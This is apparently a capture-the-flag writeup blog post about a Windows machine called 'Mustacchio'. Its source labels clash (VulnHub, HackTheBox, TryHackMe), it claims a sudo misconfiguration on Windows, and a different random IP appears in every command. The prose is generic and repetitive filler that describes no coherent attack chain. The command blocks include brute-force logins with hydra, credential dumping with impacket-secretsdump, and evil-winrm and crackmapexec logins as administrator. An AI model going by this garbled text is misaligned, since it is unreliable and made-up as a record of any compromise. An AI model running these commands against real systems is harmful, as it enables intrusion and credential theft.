---
TitleSEO: "VulnHub — Mustacchio (Medium Windows) | ZureFX"
TitlePost: "VulnHub — Mustacchio (Medium Windows)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Mustacchio. DCSync and Unquoted Service Path to achieve medium compromise on Windows."
Keywords: "pwntilldawn, windows, tryhackme, forensics, hackthebox"
URL: "https://zurefx.github.io/writeups/htb-mustacchio-440.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-mustacchio-440/"
Date: "2026-01-09"
Tags: "PwnTillDawn, Windows, TryHackMe, Forensics, HackTheBox"
Section: "writeups"
Lang: "en"
main_img: "htb-mustacchio-440"
Permalink: "/writeups/htb-mustacchio-440.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Mustacchio** is rated **Medium** on VulnHub. It runs **Windows** and the IP address during this analysis was `10.57.170.247`.

### Objectives

The service was running without proper input validation, leading to injection vulnerabilities. The backup files contained sensitive information that should not have been accessible.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
nmap -sCV -p995,993,464 10.111.180.31 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.31.3.57/FUZZ
evil-winrm -i 10.35.111.86 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.68.31.223 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The application stored sensitive credentials in an unencrypted configuration file. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Service Enumeration

The target system was identified as running a vulnerable version of the service. Token impersonation allowed elevation to SYSTEM privileges on the target. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.104.5.162/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.101.124.193 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.43.12.196/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Initial enumeration revealed several interesting open ports on the target. Weak file permissions allowed modification of critical system files.

### SMB Enumeration

The database credentials were hardcoded in the application source code. Unconstrained delegation was enabled on the compromised machine.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.33.154.86/FUZZ
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Post-exploitation enumeration revealed a path to domain administrator privileges. Group Policy Preferences contained encrypted but recoverable credentials.

## Exploitation

### Vulnerability Identification

Network traffic analysis revealed unencrypted communications containing user credentials. Command injection was possible through unsanitized user input in the search functionality. Post-exploitation enumeration revealed a path to domain administrator privileges.

Key finding: **Sudo Misconfiguration**.

Weak file permissions allowed modification of critical system files. The target system was identified as running a vulnerable version of the service.

### Initial Access

The scheduled task ran with elevated privileges and could be abused for escalation. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
nmap -sCV -p143,443,1521 10.124.73.52 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.66.168.188
gobuster dir -u http://10.59.169.59/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The backup files contained sensitive information that should not have been accessible. The backup files contained sensitive information that should not have been accessible. The scheduled task ran with elevated privileges and could be abused for escalation.

## Privilege Escalation

### Enumeration

Privilege escalation was possible due to misconfigured sudo permissions. The backup files contained sensitive information that should not have been accessible. Group Policy Preferences contained encrypted but recoverable credentials.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.116.31.99 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.67.235.157 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

The service account had excessive permissions assigned in Active Directory. The backup files contained sensitive information that should not have been accessible.

```powershell
feroxbuster -h
nmap -sCV -p8443,80,8080 10.20.42.69 -oN scan.txt
gobuster dir -u http://10.30.114.215/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.12.135.172/FUZZ
```

The backup files contained sensitive information that should not have been accessible. Command injection was possible through unsanitized user input in the search functionality.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Initial enumeration revealed several interesting open ports on the target. The target system was identified as running a vulnerable version of the service.

## Summary

### Tools Used

- `atexec`
- `nmap`
- `GetNPUsers`
- `burpsuite`
- `mimikatz`

### Key Takeaways

- DCSync
- Unquoted Service Path
- Sudo Misconfiguration
